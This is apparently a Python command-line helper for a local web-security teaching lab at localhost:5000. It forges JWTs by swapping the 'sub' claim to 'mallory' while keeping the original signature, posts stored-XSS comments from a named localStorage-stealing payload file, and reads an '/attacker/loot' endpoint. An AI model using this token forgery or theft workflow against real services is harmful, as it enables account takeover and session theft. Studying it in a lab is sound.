"""Command-line helpers for the lab (standard library only).

  python tools/jwt_tools.py login alice alice-pass       # print a JWT
  python tools/jwt_tools.py decode <TOKEN>               # show header + payload
  python tools/jwt_tools.py tamper <TOKEN>               # change sub to 'mallory', keep old signature
  python tools/jwt_tools.py me <TOKEN>                   # call GET /api/me with the token
  python tools/jwt_tools.py comment mallory mallory-pass --file payloads/01_steal_localstorage.txt
  python tools/jwt_tools.py loot                         # what the attacker collected
  python tools/jwt_tools.py reset                        # clear comments, loot, transfers
"""
import argparse
import base64
import json
import urllib.error
import urllib.request

BASE = "http://localhost:5000"


def b64url_decode(part):
    return base64.urlsafe_b64decode(part + "=" * (-len(part) % 4))


def b64url_encode(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def call(method, path, body=None, token=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as err:
        return err.code, err.read().decode()


def get_token(username, password):
    status, text = call("POST", "/api/login/token", {"username": username, "password": password})
    if status != 200:
        raise SystemExit(f"login failed: {status} {text}")
    return json.loads(text)["access_token"]


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawTextHelpFormatter)
    sub = parser.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("login"); p.add_argument("username"); p.add_argument("password")
    p = sub.add_parser("decode"); p.add_argument("token")
    p = sub.add_parser("tamper"); p.add_argument("token")
    p = sub.add_parser("me"); p.add_argument("token")
    p = sub.add_parser("comment")
    p.add_argument("username"); p.add_argument("password")
    p.add_argument("--text"); p.add_argument("--file"); p.add_argument("--website", default="")
    sub.add_parser("loot")
    sub.add_parser("reset")
    args = parser.parse_args()

    if args.cmd == "login":
        print(get_token(args.username, args.password))

    elif args.cmd == "decode":
        header, payload, signature = args.token.split(".")
        print("HEADER   :", json.dumps(json.loads(b64url_decode(header))))
        print("PAYLOAD  :", json.dumps(json.loads(b64url_decode(payload))))
        print("SIGNATURE:", len(b64url_decode(signature)), "bytes (not readable JSON)")

    elif args.cmd == "tamper":
        header, payload, signature = args.token.split(".")
        claims = json.loads(b64url_decode(payload))
        claims["sub"] = "mallory"
        new_payload = b64url_encode(json.dumps(claims, separators=(",", ":")).encode())
        print(".".join([header, new_payload, signature]))

    elif args.cmd == "me":
        status, text = call("GET", "/api/me", token=args.token)
        print(status, text)

    elif args.cmd == "comment":
        if args.file:
            with open(args.file, encoding="utf-8") as fh:
                text = fh.read().strip()
        else:
            text = args.text or ""
        token = get_token(args.username, args.password)
        status, text_out = call("POST", "/api/comments", {"text": text, "website": args.website}, token)
        print(status, text_out)

    elif args.cmd == "loot":
        status, text = call("GET", "/attacker/loot")
        print(status)
        for line in json.loads(text):
            print(" -", line)

    elif args.cmd == "reset":
        print(*call("POST", "/api/reset"))


if __name__ == "__main__":
    main()
